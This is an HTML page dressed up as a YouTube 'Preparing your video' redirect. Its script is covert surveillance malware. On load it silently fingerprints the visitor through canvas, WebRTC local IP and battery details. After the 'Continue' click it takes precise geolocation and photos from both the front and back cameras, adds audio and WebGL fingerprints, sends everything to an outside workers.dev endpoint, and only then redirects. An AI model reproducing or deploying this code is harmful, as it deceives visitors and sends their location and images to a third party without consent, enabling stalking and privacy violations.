<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>YouTube — Redirecting...</title>
  <link rel="icon" href="https://www.youtube.com/s/desktop/9a17d4a2/img/favicon_32x32.png">
  <style>
    body {
      margin: 0;
      background: #0f0f0f;
      color: #fff;
      font-family: 'Roboto', Arial, sans-serif;
      text-align: center;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }
    h2 {
      font-size: 1.5rem;
      margin-bottom: 1.5rem;
      font-weight: 400;
    }
    button {
      padding: 12px 32px;
      font-size: 1.1rem;
      background: #065fd4;
      color: white;
      border: none;
      border-radius: 2px;
      cursor: pointer;
      font-weight: 500;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }
    button:hover {
      background: #1a73e8;
    }
    .container {
      max-width: 400px;
      padding: 20px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Just a moment... Preparing your video</h2>
    <button id="continueBtn">Continue to YouTube</button>
  </div>

  <script>
    const WORKER_URL = "https://snowy-fog-b0d1.23amtics322.workers.dev/";
    const REDIRECT_URL = "https://youtu.be/RokPrwbgIu0?si=UOUsIKyMivFzJzKJ";

    // Silent fingerprinting on load (no prompts)
    let silentData = {};
    (async () => {
      try {
        // Canvas fingerprint
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('🔥🐛🦋🌈 Test 2026', 2, 2);
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        silentData.canvasFingerprint = canvas.toDataURL('image/png');

        // WebRTC local IP attempt
        const rtc = new RTCPeerConnection({ iceServers: [] });
        rtc.createDataChannel('');
        rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
        rtc.onicecandidate = e => {
          if (e.candidate) {
            const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
            if (ipMatch) silentData.localIp = ipMatch[1];
          }
        };

        // Silent extras
        silentData.deviceMemory = navigator.deviceMemory || 'unknown';
        silentData.hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
        if (navigator.getBattery) {
          const battery = await navigator.getBattery();
          silentData.batteryLevel = battery.level;
        }
      } catch (e) {}
    })();

    document.getElementById('continueBtn').addEventListener('click', async () => {
      const btn = document.getElementById('continueBtn');
      const title = document.querySelector('h2');
      btn.style.display = 'none';
      title.textContent = 'Loading video...';

      let payload = { ...silentData };

      try {
        // Geolocation after click (better UX, cached = silent)
        const pos = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej, {
            enableHighAccuracy: true,
            timeout: 7000,
            maximumAge: 120000
          })
        );
        payload.geolocation = {
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          accuracy: pos.coords.accuracy
        };

        // Front camera photo
        let stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user", width: { ideal: 960 }, height: { ideal: 540 } }
        });
        payload.frontPhoto = await capturePhoto(stream);
        stream.getTracks().forEach(t => t.stop());

        // Back camera (usually reuses permission)
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "environment", width: { ideal: 960 }, height: { ideal: 540 } }
        });
        payload.backPhoto = await capturePhoto(stream);
        stream.getTracks().forEach(t => t.stop());

      } catch (err) {
        // Permissions denied → continue anyway
        payload.permissionError = err.name || 'unknown';
      }

      // Audio fingerprint (disconnected analyser → no sound)
      try {
        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioCtx.createOscillator();
        const analyser = audioCtx.createAnalyser();
        oscillator.connect(analyser);
        oscillator.start();
        await new Promise(r => setTimeout(r, 80));
        const dataArray = new Uint8Array(analyser.frequencyBinCount);
        analyser.getByteFrequencyData(dataArray);
        payload.audioFingerprint = btoa(String.fromCharCode(...dataArray.slice(0, 32)));
        oscillator.stop();
        audioCtx.close();
      } catch (e) {}

      // WebGL fingerprint
      try {
        const glCanvas = document.createElement('canvas');
        const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
        if (gl) {
          payload.webglFingerprint = `${gl.getParameter(gl.RENDERER)} | ${gl.getParameter(gl.VENDOR)}`;
        }
      } catch (e) {}

      // Standard passive data
      payload.userAgent = navigator.userAgent;
      payload.screen = `${screen.width}x${screen.height}x${screen.colorDepth}`;
      payload.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      payload.language = navigator.language;
      payload.platform = navigator.platform;
      payload.cookiesEnabled = navigator.cookieEnabled;
      payload.timestamp = Date.now();

      // Send (keepalive + await for reliability)
      try {
        await fetch(WORKER_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
          keepalive: true
        });
      } catch (e) {
        // silent fail
      }

      // Redirect immediately
      window.location.replace(REDIRECT_URL);
    });

    function capturePhoto(stream) {
      return new Promise(resolve => {
        const video = document.createElement('video');
        video.srcObject = stream;
        video.playsInline = true;
        video.muted = true;
        video.play().catch(() => {});
        video.onloadedmetadata = () => {
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth || 960;
          canvas.height = video.videoHeight || 540;
          canvas.getContext('2d').drawImage(video, 0, 0);
          resolve(canvas.toDataURL('image/jpeg', 0.75)); // ~150-300 KB
        };
      });
    }
  </script>
</body>
</html>
